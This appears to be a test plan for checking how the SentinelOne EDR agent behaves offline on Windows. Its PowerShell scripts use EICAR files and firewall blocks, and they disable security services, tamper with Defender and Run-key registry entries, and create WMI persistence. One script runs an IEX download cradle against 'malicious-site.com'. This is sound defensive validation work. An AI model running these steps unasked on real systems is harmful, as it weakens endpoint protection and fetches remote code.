# Windows Offline Testing Scenarios

## Overview
Pengujian komprehensif kemampuan SentinelOne EDR dalam kondisi offline atau terputus dari management console pada sistem Windows Server.

---

## 🔌 B1: Windows Network Disconnection Testing

### Tujuan
Memvalidasi behavior SentinelOne agent ketika koneksi network terputus pada sistem Windows.

### Prerequisites
- [ ] SentinelOne Agent terinstall dan aktif
- [ ] Policy sudah di-sync sebelum test
- [ ] Administrator privileges
- [ ] Windows Firewall access

### Test Scenarios

#### B1.1: Windows Firewall-based Network Isolation

```powershell
# Windows Network Isolation Test Script
Write-Host "=== Windows Network Disconnection Test ===" -ForegroundColor Green

# Step 1: Check initial agent status
Write-Host "Initial agent status:" -ForegroundColor Yellow
& "C:\Program Files\SentinelOne\Sentinel Agent\SentinelCtl.exe" status

# Step 2: Block SentinelOne communication using Windows Firewall
Write-Host "Blocking SentinelOne network traffic..." -ForegroundColor Yellow
New-NetFirewallRule -DisplayName "Block SentinelOne Outbound" -Direction Outbound -RemoteAddress *.sentinelone.net -Action Block
New-NetFirewallRule -DisplayName "Block HTTPS to SentinelOne" -Direction Outbound -Protocol TCP -RemotePort 443 -Action Block

# Step 3: Verify network isolation
Write-Host "Testing network isolation:" -ForegroundColor Yellow
Test-NetConnection console.sentinelone.net -Port 443 -WarningAction SilentlyContinue
if (-not $?) {
    Write-Host "✅ Network successfully isolated" -ForegroundColor Green
}

# Step 4: Test malware detection while offline
Write-Host "Creating EICAR test file while offline:" -ForegroundColor Yellow
$eicarString = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
$eicarString | Out-File -FilePath "C:\temp\eicar_offline.txt" -Encoding ASCII

# Expected Result: File should still be detected and quarantined
Start-Sleep -Seconds 5
if (-not (Test-Path "C:\temp\eicar_offline.txt")) {
    Write-Host "✅ File quarantined while offline" -ForegroundColor Green
} else {
    Write-Host "⚠️  File detection needs verification" -ForegroundColor Yellow
}

# Step 5: Check local event logs for offline detection
Write-Host "Checking Windows Event Logs for offline detection:" -ForegroundColor Yellow
Get-WinEvent -FilterHashtable @{LogName='Application'; ProviderName='SentinelOne'} -MaxEvents 10 | 
    Where-Object {$_.Message -match "eicar|threat"} | 
    Select-Object TimeCreated, Id, LevelDisplayName, Message

# Step 6: Restore network connectivity
Write-Host "Restoring network connectivity..." -ForegroundColor Yellow
Remove-NetFirewallRule -DisplayName "Block SentinelOne Outbound" -ErrorAction SilentlyContinue
Remove-NetFirewallRule -DisplayName "Block HTTPS to SentinelOne" -ErrorAction SilentlyContinue

# Step 7: Wait for sync
Write-Host "Waiting for agent to reconnect..." -ForegroundColor Yellow
Start-Sleep -Seconds 30
& "C:\Program Files\SentinelOne\Sentinel Agent\SentinelCtl.exe" status
```

#### B1.2: Network Interface Disable Simulation

```powershell
# Simulate network interface disable
Write-Host "=== Network Interface Disable Simulation ===" -ForegroundColor Green

# Get primary network adapter
$primaryAdapter = Get-NetAdapter | Where-Object {$_.Status -eq "Up" -and $_.InterfaceDescription -notlike "*Loopback*"} | Select-Object -First 1
Write-Host "Primary adapter: $($primaryAdapter.Name)" -ForegroundColor Yellow

# Disable network adapter
Write-Host "Disabling network adapter..." -ForegroundColor Yellow
Disable-NetAdapter -Name $primaryAdapter.Name -Confirm:$false

# Create test threat
$eicarString = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
$eicarString | Out-File -FilePath "C:\temp\eicar_ifdown.txt" -Encoding ASCII

# Check agent behavior
& "C:\Program Files\SentinelOne\Sentinel Agent\SentinelCtl.exe" status

# Re-enable adapter
Write-Host "Re-enabling network adapter..." -ForegroundColor Yellow
Enable-NetAdapter -Name $primaryAdapter.Name -Confirm:$false

# Wait for network to come back
Write-Host "Waiting for network recovery..." -ForegroundColor Yellow
do {
    Start-Sleep -Seconds 5
    $connectionTest = Test-NetConnection -ComputerName "8.8.8.8" -InformationLevel Quiet
} while (-not $connectionTest)

# Verify reconnection
Start-Sleep -Seconds 30
& "C:\Program Files\SentinelOne\Sentinel Agent\SentinelCtl.exe" status
```

---

## 🛠️ B2: Windows Service Resilience Testing

### Test Service Restart Behavior

```powershell
# Windows Service Resilience Test
Write-Host "=== Windows Service Resilience Testing ===" -ForegroundColor Green

# Step 1: Get SentinelOne service information
$sentinelServices = Get-Service | Where-Object {$_.Name -like "*Sentinel*"}
Write-Host "SentinelOne Services:" -ForegroundColor Yellow
$sentinelServices | Format-Table Name, Status, StartType

# Step 2: Stop SentinelOne services
Write-Host "Stopping SentinelOne services..." -ForegroundColor Yellow
foreach ($service in $sentinelServices) {
    if ($service.Status -eq "Running") {
        Write-Host "Stopping service: $($service.Name)"
        Stop-Service -Name $service.Name -Force
    }
}

# Step 3: Create threat while services are down
Write-Host "Creating threat while services are stopped..." -ForegroundColor Yellow
$eicarString = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
$eicarString | Out-File -FilePath "C:\temp\eicar_service_down.txt" -Encoding ASCII

# Step 4: Start SentinelOne services
Write-Host "Starting SentinelOne services..." -ForegroundColor Yellow
foreach ($service in $sentinelServices) {
    if ($service.StartType -ne "Disabled") {
        Write-Host "Starting service: $($service.Name)"
        Start-Service -Name $service.Name
    }
}

# Step 5: Wait for services to fully start
Start-Sleep -Seconds 15

# Step 6: Check if threat is detected on startup
if (-not (Test-Path "C:\temp\eicar_service_down.txt")) {
    Write-Host "✅ Threat detected after service restart" -ForegroundColor Green
} else {
    Write-Host "⚠️  Threat detection needs verification" -ForegroundColor Yellow
}

# Step 7: Verify service auto-recovery
Write-Host "Service status after restart:" -ForegroundColor Yellow
Get-Service | Where-Object {$_.Name -like "*Sentinel*"} | Format-Table Name, Status
```

---

## 🔄 B3: Windows Policy Cache Validation

### Test Cached Policy Enforcement

```powershell
# Windows Policy Cache Validation Test
Write-Host "=== Windows Policy Cache Validation ===" -ForegroundColor Green

# Step 1: Verify current policy
Write-Host "Current policy status:" -ForegroundColor Yellow
& "C:\Program Files\SentinelOne\Sentinel Agent\SentinelCtl.exe" policy show

# Step 2: Disconnect from network using firewall rules
Write-Host "Disconnecting from network..." -ForegroundColor Yellow
New-NetFirewallRule -DisplayName "Block All SentinelOne" -Direction Outbound -RemoteAddress *.sentinelone.net -Action Block

# Step 3: Test policy enforcement while offline
Write-Host "Testing policy enforcement while offline..." -ForegroundColor Yellow

# Create test directory
New-Item -Path "C:\temp\policy_test" -ItemType Directory -Force

# Create various test files to trigger different policy rules
$eicarString = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
$eicarString | Out-File -FilePath "C:\temp\policy_test\eicar.txt" -Encoding ASCII

# Create large file
$largeContent = "A" * (100 * 1024 * 1024)  # 100MB
$largeContent | Out-File -FilePath "C:\temp\policy_test\largefile.txt" -Encoding ASCII

# Copy executable
Copy-Item -Path "C:\Windows\System32\calc.exe" -Destination "C:\temp\policy_test\suspicious.exe"

# Step 4: Check enforcement results
Start-Sleep -Seconds 10
Write-Host "Policy test directory contents:" -ForegroundColor Yellow
if (Test-Path "C:\temp\policy_test") {
    Get-ChildItem "C:\temp\policy_test" | Format-Table Name, Length, LastWriteTime
} else {
    Write-Host "✅ Policy enforced - directory blocked" -ForegroundColor Green
}

# Step 5: Restore connectivity
Write-Host "Restoring network connectivity..." -ForegroundColor Yellow
Remove-NetFirewallRule -DisplayName "Block All SentinelOne" -ErrorAction SilentlyContinue

# Step 6: Wait for policy sync
Start-Sleep -Seconds 30
& "C:\Program Files\SentinelOne\Sentinel Agent\SentinelCtl.exe" policy refresh

# Cleanup
Remove-Item -Path "C:\temp\policy_test" -Recurse -Force -ErrorAction SilentlyContinue
```

---

## 🔐 B4: Windows Registry Protection Testing

### Test Registry Protection While Offline

```powershell
# Windows Registry Protection Test
Write-Host "=== Windows Registry Protection Testing ===" -ForegroundColor Green

# Step 1: Disconnect from network
Write-Host "Disconnecting from network..." -ForegroundColor Yellow
New-NetFirewallRule -DisplayName "Block Registry Test" -Direction Outbound -RemoteAddress *.sentinelone.net -Action Block

# Step 2: Attempt suspicious registry modifications
Write-Host "Testing registry protection while offline..." -ForegroundColor Yellow

# Test 1: Attempt to modify Windows Defender settings
try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -ErrorAction Stop
    Write-Host "⚠️  Registry modification allowed" -ForegroundColor Yellow
} catch {
    Write-Host "✅ Registry modification blocked" -ForegroundColor Green
}

# Test 2: Attempt to add startup item
try {
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SuspiciousApp" -Value "C:\temp\malware.exe" -ErrorAction Stop
    Write-Host "⚠️  Startup item creation allowed" -ForegroundColor Yellow
} catch {
    Write-Host "✅ Startup item creation blocked" -ForegroundColor Green
}

# Test 3: Attempt to disable system services
try {
    Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction Stop
    Write-Host "⚠️  Service modification allowed" -ForegroundColor Yellow
} catch {
    Write-Host "✅ Service modification blocked" -ForegroundColor Green
}

# Step 3: Check Windows Event Logs for protection events
Write-Host "Checking event logs for protection events:" -ForegroundColor Yellow
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7036} -MaxEvents 5 | 
    Where-Object {$_.Message -match "SentinelOne"} | 
    Select-Object TimeCreated, Id, LevelDisplayName, Message

# Step 4: Restore connectivity
Write-Host "Restoring network connectivity..." -ForegroundColor Yellow
Remove-NetFirewallRule -DisplayName "Block Registry Test" -ErrorAction SilentlyContinue

# Step 5: Cleanup any test registry entries
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SuspiciousApp" -ErrorAction SilentlyContinue
```

---

## 📊 Validation Metrics

### Expected Results

| Test Scenario | Expected Behavior | Pass Criteria |
|---------------|-------------------|---------------|
| Network Disconnection | Continue threat detection locally | EICAR detected and quarantined |
| Service Restart | Resume protection immediately | Service starts < 30 seconds |
| Policy Cache | Enforce cached policies | Policies remain active offline |
| Registry Protection | Block suspicious modifications | Registry changes prevented |
| Connectivity Recovery | Auto-sync when online | Status shows "Online" within 60s |

### Windows-Specific Validation

#### Service Integration
- [ ] **Service Recovery**: Services auto-restart after failure
- [ ] **Service Dependencies**: Proper dependency management maintained
- [ ] **Service Permissions**: Adequate permissions for offline operation
- [ ] **Service Logging**: Events logged to Windows Event Log

#### Registry Protection
- [ ] **Critical Keys Protected**: System-critical registry keys protected
- [ ] **Startup Protection**: Malicious startup entries blocked
- [ ] **Policy Registry**: SentinelOne policies stored securely
- [ ] **Recovery Mechanisms**: Registry protection recovers from tampering

#### Event Log Integration
- [ ] **Application Log**: SentinelOne events in Application log
- [ ] **Security Log**: Security events properly logged
- [ ] **System Log**: Service events in System log
- [ ] **Custom Logs**: SentinelOne-specific logs available

---

## 🔧 PowerShell Integration Testing

### Advanced PowerShell Protection

```powershell
# PowerShell Protection Test While Offline
Write-Host "=== PowerShell Protection Testing ===" -ForegroundColor Green

# Disconnect from network
New-NetFirewallRule -DisplayName "PS Test Block" -Direction Outbound -RemoteAddress *.sentinelone.net -Action Block

# Test 1: Encoded command execution
$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Host 'This is a test'"))
try {
    powershell.exe -EncodedCommand $encodedCommand
    Write-Host "✅ Encoded command executed (expected)" -ForegroundColor Green
} catch {
    Write-Host "⚠️  Legitimate encoded command blocked" -ForegroundColor Yellow
}

# Test 2: Suspicious PowerShell activity
$suspiciousCommand = @"
IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/payload.ps1')
"@

try {
    Invoke-Expression $suspiciousCommand
    Write-Host "⚠️  Suspicious command executed" -ForegroundColor Red
} catch {
    Write-Host "✅ Suspicious PowerShell activity blocked" -ForegroundColor Green
}

# Test 3: WMI-based persistence attempt
try {
    $filterName = 'TestFilter'
    $query = "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2"
    $wmiFilter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name=$filterName; EventNameSpace="root\cimv2"; QueryLanguage="WQL"; Query=$query}
    Write-Host "⚠️  WMI persistence created" -ForegroundColor Yellow
} catch {
    Write-Host "✅ WMI persistence attempt blocked" -ForegroundColor Green
}

# Restore connectivity
Remove-NetFirewallRule -DisplayName "PS Test Block" -ErrorAction SilentlyContinue

# Cleanup
Get-WmiObject -Class __EventFilter -Namespace "root\subscription" | Where-Object {$_.Name -eq 'TestFilter'} | Remove-WmiObject -ErrorAction SilentlyContinue
```

---

## Validation Checklist

### Network Disconnection Validation
- [ ] **Offline Detection**: Threats detected without internet connection
- [ ] **Local Quarantine**: Malicious files quarantined locally
- [ ] **Policy Enforcement**: Cached policies remain active
- [ ] **Event Logging**: Activities logged locally
- [ ] **Auto-Reconnection**: Agent reconnects when network restored

### Service Resilience Validation
- [ ] **Service Stability**: Services remain stable during network issues
- [ ] **Auto-Recovery**: Services auto-restart after crashes
- [ ] **Dependency Management**: Service dependencies properly managed
- [ ] **Performance Impact**: Minimal performance impact during offline mode

### Windows-Specific Protection
- [ ] **Registry Protection**: Critical registry keys protected offline
- [ ] **PowerShell Monitoring**: PowerShell activities monitored offline
- [ ] **WMI Protection**: WMI abuse prevented offline
- [ ] **File System Protection**: File system activities monitored offline

---

## Next Steps

Continue with:
- [Windows Performance Testing](windows-performance.md)
- [Windows Enterprise Testing](windows-enterprise.md)
- [Cross-Platform Offline Scenarios](../cross-platform/cross-platform-testing.md)

---

*Last updated: {{ git_revision_date_localized }}*
